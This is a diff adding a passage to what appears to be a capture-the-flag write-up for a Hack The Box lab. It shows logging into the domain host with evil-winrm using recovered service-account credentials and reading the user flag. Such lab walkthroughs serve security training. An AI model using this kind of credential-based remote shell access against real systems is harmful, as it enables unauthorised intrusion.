@@ -374,3 +374,34 @@ Session completed.
 ```
 
 <br />
+
+If we try to use this credentials to log in with `Evil-WinRM`, it works:
+
+<br />
+
+```bash
+❯ evil-winrm -i htb.local -u 'svc-alfresco' -p 's3rvice'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
+htb\svc-alfresco
+```
+
+<br />
+
+And we can retrieve the `user.txt` flag:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
+74e13bb90682f97a1a44c39a76xxxxxx
+```
+
+<br />
